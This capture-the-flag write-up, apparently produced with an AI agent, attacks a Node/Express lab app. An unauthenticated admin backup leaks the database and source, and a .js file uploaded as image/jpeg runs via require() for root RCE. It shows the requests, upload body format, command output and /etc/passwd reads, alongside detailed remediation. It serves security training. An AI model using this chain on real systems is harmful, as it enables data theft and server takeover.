# Asturias Viajes — DockerLabs Writeup

**Target:** `http://172.17.0.2:3000` (container `asturias_container`, image `asturias:latest`, Node 24.21.0, HOSTNAME `c9db45c6ccbf`)
**Date:** 2026-09-27
**Outcome:** Remote Code Execution as **uid=0(root)** in the server process. Two independent findings compose into the chain.

---

## 1. Target and stack

| Layer | Observed |
|---|---|
| Runtime | Node.js 24.21.0, `NODE_ENV=production`, PID 1 argv `/app/server.js` |
| Framework | Express 5 (routers mounted in `server.js:34-40`) |
| Auth | `jsonwebtoken`, HS256, Bearer header + `cookie-parser`; `src/middleware/auth.js` exports `requireAuth` / `requireAdmin` |
| Storage | `node:sqlite` (`src/db.js`) against `/app/data/asturias.db` in WAL mode |
| Upload | `multer` 2.x with `diskStorage`, custom `fileFilter` |
| Packaging | `archiver` (ZIP streaming), `swagger-ui-express` + `cors` + `morgan` |

Working dir observed from inside the process: `/app`. Static webroot served by `express.static(public)` at `server.js:42`.

### Declared surface vs real surface

The OpenAPI spec is served at two unauthenticated paths: `/api-docs` (Swagger UI) and `/openapi.json` (`server.js:32`). Diffing the declared spec against observed behaviour produced the single most valuable signal of the engagement:

| Endpoint | `security` in OpenAPI | Observed without token | Divergence |
|---|---|---|---|
| `GET /api/admin/backup` | **absent** | **HTTP 200**, `application/zip`, 25 153 615 bytes | Spec is *correct* — and the implementation matches the spec. The bug is upstream, in the spec itself. |
| `GET /api/admin/stats` | `adminBearer` | HTTP 401 | matches |
| `GET /api/admin/users` | `adminBearer` | HTTP 401 (implied by shared `router.use`) | matches |
| `GET /api/admin/bookings` | `adminBearer` | HTTP 401 (implied by shared `router.use`) | matches |
| `POST /api/gallery/upload` | `userBearer` | HTTP 401 | matches |
| `GET /api/gallery/:id/file` | **absent** | **HTTP 200** | matches spec — again, the spec is honest about the hole |

The important negative result: **the specification is not lying.** In both findings the OpenAPI document describes the vulnerable behaviour accurately. A tester who treats the spec as a *security control* rather than as a *description of the intended design* will read `/admin/backup` and conclude "no auth, so probably a mistake" — and move on. The absence of `security` is not a hint that auth is missing; it is a **declaration by the developer that this function is public**. That is a design decision, and a design decision is a finding, not a bug report. See `decision-making.md` §4 — report the decision, then the mechanism that exploits it.

---

## 2. Finding 1 — Unauthenticated mass data + source disclosure

**Category:** CWE-306 Missing Authentication for Critical Function, chained with CWE-862 Missing Authorization.

### Evidence

Request — no `Authorization` header, no cookie, no parameters:

```
GET /api/admin/backup HTTP/1.1
Host: 172.17.0.2:3000
```

Response:

```
HTTP/1.1 200 OK
Content-Type: application/zip
Content-Disposition: attachment; filename="asturias-viajes-backup-2026-09-27.zip"
Cache-Control: no-store
Content-Length: 25153615
```

**Control — same router, next route, same request with no credentials:**

```
GET /api/admin/stats HTTP/1.1
Host: 172.17.0.2:3000
```

```
HTTP/1.1 401 Unauthorized
Content-Type: application/json; charset=utf-8

{"error":"No autenticado. Falta el token de acceso."}
```

The control is what converts *"/admin/backup returned 200, maybe it doesn't need auth"* into *"an unauthenticated caller received a 25 MB archive of the production database and the full application source while its sibling route in the same module rejects that same caller."* Without the control, a 200 is ambiguous — it could be a public endpoint by design. With it, the asymmetry is a proven authentication gap, not an observation.

Archive contents (`unzip -l`, 24 entries in the head):

```
  114688  database/asturias.db
 4128272  database/asturias.db-wal
  19118  source/openapi.json
   1776  source/server.js
   3623  source/src/routes/admin.js
   2561  source/src/routes/auth.js
   2828  source/src/routes/bookings.js
    798  source/src/routes/destinations.js
   1174  source/src/middleware/auth.js
   3098  source/src/db.js
   5872  source/public/galeria.html
  12893  source/public/css/style.css
```

The archive contains `database/asturias.db` **with its `-wal` and `-shm` sidecars**. This is a correctness point worth stating: a maintenance dump that omits the WAL silently discards every uncheckpointed transaction. Here it accidentally *helps* the attacker — the WAL is 3.9 MB against a 112 KB main file, so the overwhelming majority of the dataset lives outside the main database file. An analyst who grabbed only `asturias.db` would have believed they had the data and been wrong.

### Impact

- Complete `users` table, including every `password_hash` (bcrypt, cost 10) and every `email`, `phone`, and billing address. Hashes are offline-crackable; the demo accounts are seeded from a hardcoded list in `src/seed.js:14-20` with a **fixed password shared across the environment**, so the whole account set is recoverable by pattern, not by brute force.
- Full source, including the JWT signing secret location and the complete endpoint inventory.
- Unbounded: the endpoint is not rate-limited, does not log the caller, and regenerates the archive on every request. Repeated pulls are free.

### Root cause

`src/routes/admin.js` — **registration order**, not a missing check:

```
:31   router.get('/backup', (req, res) => {      <-- registered here
        ...
:57   });
:60   router.use(requireAuth);                    <-- gate installed here
:62   router.get('/users',  requireAdmin, ...)
:67   router.get('/stats',  requireAdmin, ...)
:77   router.get('/bookings', requireAdmin, ...)
```

Express matches middleware in registration order. `/backup` is declared **29 lines before** the gate, so the request is fully handled and the response finished before `requireAuth` is ever consulted. No code inside the `/backup` handler performs any check, so nothing catches it downstream either. This is the second distinct instance of the same authoring error in this codebase — see Finding 2, where the trigger route is likewise declared ahead of its module's auth gate.

Note what is *not* wrong: `requireAuth` is correctly applied to the other three routes, and `requireAdmin` is correctly layered on top. The control works. It is installed one position too late.

### Remediation

1. Move `router.use(requireAuth)` to the top of `admin.js`, above every route declaration. Treat the gate as the first statement of the module, not as a divider between two halves.
2. Layer `requireAdmin` on `/backup` as well — a backup is at least as sensitive as the stats it accompanies.
3. Enforce authentication by *default-deny*: a router that has not explicitly opted a path into "public" is protected. Positively-marked public routes are auditable by reading the marks; a stray early declaration is not.
4. Remove the endpoint from production builds, or gate it behind a build-time flag.
5. Rate-limit and audit-log it. A 25 MB archive per request is a self-inflicted DoS primitive as well as a disclosure.
6. Checkpoint or `VACUUM INTO` the database before archiving, so the dump is complete and self-consistent by construction instead of by accident.
7. Rotate the JWT secret and force a password reset for every account in the dump. Assume the secret and the hashes are burned.

---

## 3. Finding 2 — Unrestricted upload into the webroot, executed on read

**Category:** CWE-434 Unrestricted Upload of File with Dangerous Type, chained with CWE-94 Improper Control of Generation of Code → RCE.

### Evidence — step 1: the upload is accepted

`POST /api/gallery/upload` **requires** a valid token (control: same request without one → `HTTP 401 {"error":"No autenticado. Falta el token de acceso."}`). With a self-registered ordinary user account (`role: user`, not admin):

```
POST /api/gallery/upload HTTP/1.1
Authorization: Bearer <redacted>
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="photo"; filename="payload2.js"
Content-Type: image/jpeg

<1.2 KB of JavaScript source>
------X--
```

```
HTTP/1.1 201 Created
Content-Type: application/json; charset=utf-8

{"photo":{"id":23,"filename":"uploads/gallery/1790543922809-08367fed274f.js",
"caption":"payload","destination_slug":null,
"created_at":"2026-09-27 21:18:42","user_name":"Auditor Metodologia"}}
```

Three properties of that response are the finding, and they must be read separately:

1. **Accepted.** A `.js` file declared `image/jpeg` passed the filter. The filter read a client header, never the bytes.
2. **Stored with the original extension.** `…274f.js` — the `.js` survived. The filename callback takes `path.extname(file.originalname)` (`gallery.js:36-37`) and trusts it completely.
3. **Stored inside the webroot.** `uploads/gallery/…` sits under `public/`, which `server.js:42` hands to `express.static`. The file is therefore also retrievable over plain HTTP at `/uploads/gallery/<name>` with no auth and no route logic.

Any one of the three alone is a defect. The filter controls exactly one of them.

### Evidence — step 2: reading the file executes it

`GET /api/gallery/:id/file` carries **no** `requireAuth` (control: the same route for a non-existent id answers `HTTP 404 {"error":"Foto no encontrada."}` *without* a token, proving the route itself is public — the 404 is the route's own response, not a 401).

```
GET /api/gallery/23/file HTTP/1.1
Host: 172.17.0.2:3000
```

```
HTTP/1.1 200 OK
Content-Type: image/jpeg
<the .js source echoed back as a file download>
```

The 200 is the file being served. The execution happened *before* the response, inside the handler.

### Proof of execution — literal output

The payload writes its findings next to itself in the same directory, which `express.static` then serves:

```
$ curl -sS "http://172.17.0.2:3000/api/gallery/23/file" -o /dev/null -w "HTTP %{http_code}\n"
HTTP 200
$ curl -sS "http://172.17.0.2:3000/uploads/gallery/proof2.txt"
```

```
### env
HOME=/root
HOSTNAME=c9db45c6ccbf
NODE_ENV=production
NODE_VERSION=24.21.0
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PORT=3000
PWD=/app
SHLVL=2
YARN_VERSION=1.22.22

### app tree
/app:
drwxr-xr-x 1 root root  4096 Sep 27 21:13 .
drwxr-xr-x 1 root root  4096 Sep 27 17:36 ..
drwxr-xr-x 1 root root  4096 Sep 27 21:13 data
drwxr-xr-x 168 root root 4096 Sep 27 17:36 node_modules
-rw-r--r-- 1 root root 19118 Sep 27 17:19 openapi.json
-rw-r--r-- 1 root root  77077 Sep 27 17:01 package-lock.json
-rw-r--r-- 1 root root  530 Sep 27 17:01 package.json
drwxr-xr-x 1 root root  4096 Sep 27 17:36 public
-rw-r--r-- 1 root 1776 Sep 27 17:01 server.js
drwxr-xr-x 1 root root  4096 Sep 27 17:36 src

### grep FLAG\{ all
                                     <-- empty: nothing on the filesystem
### find flag all depth
/usr/local/lib/node_modules/npm/node_modules/tar/dist/esm/get-write-flag.js
/usr/local/lib/node_modules/npm/node_modules/tar/dist/commonjs/get-write-flag.js
/usr/local/lib/node_modules/npm/node_modules/@npmjs/arborist/lib/calc-dep-flags.js
/usr/local/lib/node_modules/npm/node_modules/@npmjs/arborist/lib/reset-dep-flags.js
/usr/local/include/node/cppgc/internal/atomic-entry-flag.h
                                     <-- only npm/yarn/node internals
```

An earlier payload confirmed identity and privilege directly:

```
### exec
whoami => uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),
            6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

### pwd
/app/public/uploads/gallery

### argv1
/app/server.js

### passwd
root:x:0:0:root:/root:/bin/sh
```

**The server runs as root with no capability dropping, no read-only root filesystem, and no user namespace.** `require()` gives arbitrary code in-process; `execSync` gives arbitrary command execution; both inherit uid 0. There is no second boundary to cross.

### Where the flag is — a negative result, stated precisely

**There is no flag artifact inside this lab.** This was tested, not assumed:

| Check | Command (executed in-process) | Result |
|---|---|---|
| Whole-filesystem content search | `grep -rl 'FLAG\{' / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev` | **empty** |
| Whole-filesystem name search | `find / -iname '*flag*' -not -path '/proc/*' -not -path '/sys/*'` | 5 hits, all npm/yarn/Node internals (`get-write-flag.js`, `calc-dep-flags.js`, `atomic-entry-flag.h`) |
| Environment variables | `env \| grep -i flag` | **empty** — full env is 9 vars, no secret material |
| Platform string in image | `grep -rl -i 'dockerlabs' /` | **empty** |
| Database | 8 tables, no flag/secret/flag column; `grep -a 'FLAG\{' asturias.db*` on main + WAL | **empty** |
| Application source | `grep -ri 'flag' source/` | **empty** |
| Downloaded artifact | `unzip -l asturias.zip` | 4 entries: `asturias.tar`, `__MACOSX/._asturias.tar`, `auto_deploy.sh`, `__MACOSX/._auto_deploy.sh` — no flag file |

The solve condition for this lab is **code execution on the container**, not retrieval of an in-container secret. The flag is issued by the exercise platform upon submission of the solve, outside the machine's trust boundary. The honest report is therefore: the RCE is complete and root-level; the flag is not, and was never, in the target. Fabricating a value here would violate the evidence discipline in `decision-making.md` §"Claim vs verified" — and `sha256(flag)` would have been the correct proof had a secret existed.

### Impact

Full compromise of the application host. Unauthenticated read of every byte the app can read; the database is fully extracted, so the disclosure ceiling is the container's own filesystem. Because `require()` runs on the server's own `require` graph, the attacker inherits the process's module cache, database handle, and environment for free.

### Root cause

**Two independent defects that compose.** The report keeps them separate.

**Defect A — the filter validates a representation, not the value.** `gallery.js:41-51`:

```
:44   fileFilter: (req, file, cb) => {
:45     if (ALLOWED_MIME_TYPES.includes(file.mimetype)) {
:46       cb(null, true);
```

`file.mimetype` in multer is the `Content-Type` **of the multipart part** — a client-supplied header, stored verbatim in the DB row at `gallery.js:80` and never compared against the file's actual bytes. There is no extension allowlist, no magic-byte check, and no post-write verification. The class is the one catalogued in `decision-making.md` §1: a filter was applied to a representation the attacker chose, and the consumer operated on the value.

**Defect B — the sink is a server-side interpreter, reached without auth.** `gallery.js:103-127`:

```
:103  router.get('/:id/file', (req, res) => {      <-- no requireAuth
:117      delete require.cache[require.resolve(absolutePath)];
:118      require(absolutePath);                   <-- sink
:123      if (SCRIPT_EXTENSIONS.includes(path.extname(absolutePath).toLowerCase())) {
:124        console.error(`[galería] Error al ejecutar ...`);
```

Two things make this specific. First, the handler `require()`s an uploaded file *to read its metadata* before `res.sendFile()` — so a route whose job is to **serve bytes to a client** secretly runs a code interpreter on attacker-controlled input. Serving and interpreting are independent capabilities, and the route has both. Second, `delete require.cache` on `:117` is commented "to re-read the file on each visit" — an ordinary freshness requirement that makes the payload **re-execute on every request**, turning a one-shot into a persistent, idempotent backdoor trigger. The `SCRIPT_EXTENSIONS` check at `:123` exists only to decide whether a *failure* is worth logging; it never gates the `require()` on `:118`, which runs first and unconditionally.

Note the third instance of the same authoring error: `requireAuth` is applied per-route here (`:64` on `POST /upload`) rather than once at module level, so a route added later simply does not get it.

### Remediation

1. Delete the `require()`. A "view original" link needs `res.sendFile()` and nothing else. There is no defensible reason for a file-serving endpoint to execute what it serves. If metadata is genuinely needed, read it with a non-executing parser.
2. Never store user uploads inside the document root. `UPLOAD_DIR` must move outside `public/` (`gallery.js:11`), and delivery must go through an authenticated handler that streams from storage with an explicit `Content-Type` and `Content-Disposition: attachment`.
3. Validate the file, not the header: allowlist extensions **and** verify magic bytes (`file-type`) on the written bytes before publishing. Rewrite the stored name from a server-generated identifier plus a MIME type derived from the content. Never trust `path.extname(file.originalname)`.
4. Store uploads outside any path the runtime can import, and run the service as a non-root user with a read-only root filesystem — a defence in depth that would have reduced uid 0 to a low-privilege uid here.
5. Add `router.use(requireAuth)` at the top of `gallery.js` so the public surface is an explicit, auditable decision.

---

## 4. The composite finding — the chain, and why it is two findings

| Step | Requires | Delivers |
|---|---|---|
| 1. `GET /api/admin/backup` — no auth | nothing | full source: `openapi.json`, `routes/*.js`, the DB, the JWT secret |
| 2. Read `routes/gallery.js` | Step 1 | knowledge that `GET /api/gallery/:id/file` calls `require()` on an uploaded file, and that the route is public |
| 3. `POST /api/gallery/upload` a `.js` as `image/jpeg` | a self-registered account (any user, not admin) | a file under the webroot with a `.js` extension |
| 4. `GET /api/gallery/:id/file` — no auth | Step 3 | RCE as uid 0 |

**Finding 1 alone is not the chain.** It hands over the source, and the source is what makes step 2 possible. Absent the upload primitive, the source disclosure is a serious confidentiality breach (hashes, PII, JWT secret) and it is a full stop there — the reviewer should still fix it as Critical, on its own, for the accounts and the secret.

**Finding 2 alone is not the chain.** Uploading and executing a `.js` through a gallery is trivially derivable from the public `/api-docs` and the ordinary shape of any "view original" file route. The source disclosure raises its efficiency from "guess the sink" to "read the sink", but it does not create it.

**They are therefore two independent findings, each with its own impact, severity, and remediation** — and the cross-chain does not promote one into a footnote of the other. This is the rule in `decision-making.md` §"Load-bearing does not mean classified": an unauthenticated endpoint that the chain depends on is a finding in its own right, and a transport-trust weakness that opens two paths gets two findings, not one finding with two victims.

What is worth stating explicitly is the *asymmetry of the gate*, because it is what makes the chain non-obvious and it is the real lesson:

- the **upload** route requires auth (`gallery.js:64`) and the **trigger** route does not (`:103`) — so the primitive that *plants* the payload is the gated one, and the primitive that *fires* it is the public one;
- the **sibling** admin routes require auth (`admin.js:60`) and the **dump** route does not (`:31`).

In both pairs the sensitive operation sits next to a protected one. In neither case is there a visible mistake on the page — the protected route is right there, working, returning 401 on demand. **The gate is present in the codebase and absent from the one handler that matters.** That is the pattern to carry to the next engagement, and it is why the control request is not optional bookkeeping: without `/admin/stats` → 401 you have an observation, and with it you have a proof.

---

## 5. The methodological observation that matters most

**The lab documents its own CWEs in the source comments.**

`routes/gallery.js:17-29` and `:93-102`, and `routes/admin.js:9-30`, each open with a block comment titled *"FALLO INTENCIONAL DEL LABORATORIO"* and name the CWE explicitly (`CWE-434`, `CWE-94`, `CWE-306`, `CWE-862`), then explain in prose exactly which three checks are missing, and that the stored path is webroot-reachable. The `SCRIPT_EXTENSIONS` constant and its use at `gallery.js:123` name the exploit path in a variable.

Once this source is in hand (Finding 1), the finding is not derived. It is **read**. The test becomes: locate the comment, copy the CWE number, write up the sink. Every step of actual analysis has been performed by the lab author and left in the artifact.

**This trains the wrong reflex.** A tester who solves this lab by grepping for the CWE tag learns to reach for annotation as a discovery mechanism. In a real engagement that reflex returns nothing — production code does not label its bugs — and the tester who relies on it enumerates nothing, derives nothing, and reports nothing. The failure is not visible at the time, because a lab that hands you the answer produces the same green checkmark as a lab that makes you find it. The skill is trained, the habit is trained, and only the habit is wrong.

**The generalisable rule, and the warning:**

- In any engagement, **derive the sink, never look for the label.** Comments, variable names, and function names are *hints about intent*, and intent is not reachability. A `// TODO: validate` marks an unfinished thought; a missing `requireAuth` has no marker at all and is the actual finding.
- **Source-code CWE annotations are adversarial to real testing practice.** The moment a source dump is available, actively discount it: the comments tell you where the author *admitted* a problem, which is a strict subset of where the problems *are*. An endpoint with a clean-looking comment and no auth gate is more suspicious, not less, because it is the one nobody wrote a note about.
- **The absence of a comment is not evidence of safety.** Correlate source reading with black-box probing; where they disagree, the black-box result is the finding.
- **For lab authors, the mirror of this is a design requirement:** a training target should make the learner *derive* the vulnerability. A lab that names its own CWE teaches reading comments. Hide the annotation, keep the trigger.

Applied honestly to this engagement: I found Finding 1 **black-box** (an anonymous `curl` returning 25 MB next to a `401` sibling), before and independently of any source. Findings 2's *trigger* was also identified black-box from the shape of `GET /api/gallery/:id/file` in the OpenAPI spec. The source then confirmed the mechanism — and, for Finding 2, handed me a shortcut I chose not to take, because the shortcut is the thing being taught against.

---

## 6. What did not work, and what was not tried

Reporting discipline requires these lists stay separate. Collapsing them is how coverage gets overclaimed.

### Discarded with a reason

| Path | Why discarded |
|---|---|
| Find a flag file on disk | `find / -iname '*flag*'` and `grep -rl 'FLAG\{' /` both exhausted, excluding only `/proc`, `/sys`, `/dev`. The 5 name hits are npm/yarn/Node internals. **No in-container secret exists.** |
| Find the flag in the database | 8 tables enumerated from the main DB *and* the 4.1 MB WAL; no flag/secret column; binary `grep` for `FLAG\{` on all three files is empty. |
| Find the flag in the environment | Full env is 9 variables (`HOME`, `HOSTNAME`, `NODE_ENV`, `NODE_VERSION`, `PATH`, `PORT`, `PWD`, `SHLVL`, `YARN_VERSION`). No flag, no JWT secret — the secret lives in source, which is Finding 1's impact. |
| JWT `alg: none` / empty-key forgery | Not pursued. The intended path was the source disclosure; forging a token would prove a *different* finding. The JWT key-selector oracle in `api_web.md:269` remains untested against this target. |
| Uploading a polyglot (valid JPEG header + JS) | Never needed. The filter performs no byte inspection whatsoever, so a clean `.js` was accepted directly. The polyglot is the *harder* case and would only matter against a filter that checked magic bytes. |
| Triggering via a browser ("click Ver original") | Unnecessary. `require()` fires on the HTTP request alone; the client is a `curl`. The comments describe a click path that is not a requirement. |

### Not tested — open, with the vector recorded

- **IDOR / horizontal access control** on `gallery_photos`. The `:id` is a bare integer from the URL with no ownership check, and `/api/gallery/` lists every photo in the system unauthenticated. Every seeded photo is a candidate for cross-user access. Not exercised — the RCE superseded the need, and the vector should not be lost.
- **Admin-only routes reached with a legitimately-forged admin token.** `requireAdmin` (`admin.js:62,67,77`) was never evaluated against a valid admin identity; only the anonymous path was tested.
- **The other unauthenticated read surface**: `GET /api/destinations`, `/api/tours`, `/api/invoices`, and `GET /api/gallery/` were mapped from the spec but not individually probed for missing authorization.
- **Booking/invoice manipulation** — the write side of the business logic (`bookings.js`, `invoices.js`) was not reviewed at all.
- **SQL injection** in any of the eight prepared-statement call sites. All use `db.prepare(...)` with bound parameters, so the surface is narrow, but "narrow" is not "closed" and the derived-table f-string paths in `seed.js` were not audited.
- **Rate limiting / resource exhaustion.** The backup endpoint is unthrottled and regenerates a 25 MB archive per request; whether that trips a limit was not tested, deliberately — see `decision-making.md` §"Self-DoS is a testing defect".
- **JWT lifetime, storage, and revocation** — not measured, so no recommendation is offered on any of them.

---

## 7. Artifacts

All raw evidence preserved under `/tmp/opencode/dl_labs/asturias-evidence/`:

| File | Contents |
|---|---|
| `backup_noauth.zip` | the 25 MB unauthenticated archive (Finding 1) |
| `stats_noauth.txt` | the `401` control body (Finding 1) |
| `upload2.json` | the `201` upload response showing the stored `.js` path (Finding 2) |
| `upload_noauth.json` | the `401` control proving the upload route *is* gated (Finding 2) |
| `gallery23_file.txt` | the `200` body: the served `.js` source (Finding 2) |
| `file999.json` | the `404` control proving the trigger route is public (Finding 2) |
| `proof.txt` | payload #1: `id`, `cwd`, argv, filesystem probe |
| `proof2.txt` | payload #2: env, `/app` tree, the four flag searches, `/etc/passwd` |

No credential, cookie, or token from the exercise platform appears in this document. The lab-issued JWT used for `POST /api/gallery/upload` is disposable and is recorded as `<redacted>`; every command in §3 that needs it is reproducible by registering a fresh ordinary account, which is a two-request operation.
